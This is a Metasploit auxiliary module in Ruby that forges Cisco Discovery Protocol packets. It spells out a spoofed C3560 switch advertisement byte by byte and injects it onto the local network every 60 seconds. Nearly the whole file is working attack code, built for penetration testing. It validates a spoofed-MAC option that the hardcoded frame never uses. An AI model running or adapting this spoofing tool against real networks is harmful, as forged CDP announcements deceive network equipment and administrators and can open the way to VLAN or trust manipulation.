##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Capture

	def initialize(info = {})
		super(
			'Name'        => 'Forge Cisco CDP Packets',
			'Description'	=> %q{
				This module forges CDP packets.
			},
			'Author'		=> [ 'jbabio [at] me.com>' ],
			'License'		=> MSF_LICENSE,
			'Actions'     =>
				[
					[ 'Service' ]
				],
			'PassiveActions' => [ 'Service' ],
			'DefaultAction'  => 'Service'
		)
		register_options(
			[
				OptString.new('SMAC',    	[false, 'The spoofed mac (if unset, derived from netifaces)']),
			], self.class)
		deregister_options('RHOST', 'PCAPFILE')
	end

	def build_cdp_frame
		p = PacketFu::EthPacket.new
		p.eth_daddr = '01:00:0c:cc:cc:cc'
		p.eth_saddr = 'de:ad:be:ef:00:01'	
		llc_hdr =	"\xaa\xaa\x03\x00\x00\x0c\x20\x00"
		cdp_hdr =	"\x02"				   # version
		cdp_hdr <<	"\xb4"			           # ttl
		cdp_hdr <<	"\x0b\xea"				   # checksum
		cdp_hdr <<	"\x00\x01\x00\x06\x53\x31"         # CDP DeviceID
		cdp_hdr <<	"\x00\x05\x00\xc2\x43\x69\x73\x63\x6f\x20\x49\x4f\x53\x20\x53\x6f" # Software Version
		cdp_hdr <<	"\x66\x74\x77\x61\x72\x65\x2c\x20\x43\x33\x35\x36\x30\x20\x53\x6f"
		cdp_hdr	<<	"\x66\x74\x77\x61\x72\x65\x20\x28\x43\x33\x35\x36\x30\x2d\x41\x44"
		cdp_hdr <<	"\x56\x49\x50\x53\x45\x52\x56\x49\x43\x45\x53\x4b\x39\x2d\x4d\x29"
		cdp_hdr <<	"\x2c\x20\x56\x65\x72\x73\x69\x6f\x6e\x20\x31\x32\x2e\x32\x28\x34"
		cdp_hdr <<	"\x34\x29\x53\x45\x2c\x20\x52\x45\x4c\x45\x41\x53\x45\x20\x53\x4f"
		cdp_hdr	<<	"\x46\x54\x57\x41\x52\x45\x20\x28\x66\x63\x31\x29\x0a\x43\x6f\x70"
		cdp_hdr	<<	"\x79\x72\x69\x67\x68\x74\x20\x28\x63\x29\x20\x31\x39\x38\x36\x2d"
		cdp_hdr <<	"\x32\x30\x30\x38\x20\x62\x79\x20\x43\x69\x73\x63\x6f\x20\x53\x79"
                cdp_hdr <<      "\x73\x74\x65\x6d\x73\x2c\x20\x49\x6e\x63\x2e\x0a\x43\x6f\x6d\x70"
                cdp_hdr <<      "\x69\x6c\x65\x64\x20\x53\x61\x74\x20\x30\x35\x2d\x4a\x61\x6e\x2d"
		cdp_hdr <<	"\x30\x38\x20\x30\x30\x3a\x31\x35\x20\x62\x79\x20\x77\x65\x69\x6c"
		cdp_hdr <<	"\x69\x75"
		cdp_hdr <<      "\x00\x06\x00\x17\x63\x69\x73\x63\x6f\x20\x57\x53\x2d\x43\x33\x35" # Platform
		cdp_hdr	<<	"\x36\x30\x2d\x32\x34\x54\x53" 
		cdp_hdr <<      "\x00\x02\x00\x11\x00\x00\x00\x01\x01\x01\xcc\x00\x04\x00\x00\x00" # Addresses
		cdp_hdr	<<	"\x00" 
		cdp_hdr << 	"\x00\x03\x00\x14\x46\x61\x73\x74\x45\x74\x68\x65\x72\x6e\x65\x74" #PortID
		cdp_hdr <<	"\x30\x2f\x31\x33" 
		cdp_hdr <<      "\x00\x04\x00\x08\x00\x00\x00\x28" # Capabilities
                cdp_hdr <<      "\x00\x08\x00\x24\x00\x00\x0c\x01\x12\x00\x00\x00\x00\xff\xff\xff" # Protocol Hello
		cdp_hdr	<<	"\xff\x01\x02\x20\xff\x00\x00\x00\x00\x00\x00\x00\x18"
		cdp_hdr <<	"\xba\x98\x68\x80\xff\x00\x00"
		cdp_hdr <<      "\x00\x09\x00\x04" # VTP Management Domain
		cdp_hdr <<	"\x00\x0a\x00\x06\x00\x01" #Native Vlan	
		cdp_hdr <<      "\x00\x0b\x00\x05\x01" # Duplex
		cdp_hdr <<      "\x00\x12\x00\x05\x00" # Trust Bitmap
		cdp_hdr <<      "\x00\x13\x00\x05\x00" # Untrusted port
		cdp_hdr <<      "\x00\x16\x00\x11\x00\x00\x00\x01\x01\x01\xcc\x00\x04\x00\x00\x00" # Management Addresses
                cdp_hdr <<      "\x00"	 
		cdp_hdr << 	"\x00\x1a\x00\x10\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff" 
		
		
		p.eth_proto = llc_hdr.length + cdp_hdr.length
		p.payload = llc_hdr << cdp_hdr
		p
	end

	def is_mac?(mac)
		!!(mac =~ /^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$/)
	end

	def smac
		@spoof_mac ||= datastore['SMAC']
		@spoof_mac ||= get_mac(interface) if netifaces_implemented?
		return @spoof_mac
	end

	def run
		unless smac()
			print_error 'Source MAC (SMAC) should be defined'
		else
			unless is_mac? smac()
				print_error "Source MAC (SMAC) `#{smac}' is badly formatted."
			else
				print_status "Starting CDP spoofing service..."
				open_pcap({'FILTER' => "ether host 01:00:0c:cc:cc:cc"})
				interface = datastore['INTERFACE'] || Pcap.lookupdev
				cdp = build_cdp_frame()
				@run = true
				while @run
					capture.inject(cdp.to_s)
					select(nil, nil, nil, 60)
				end
				close_pcap
			end
		end
	end

end
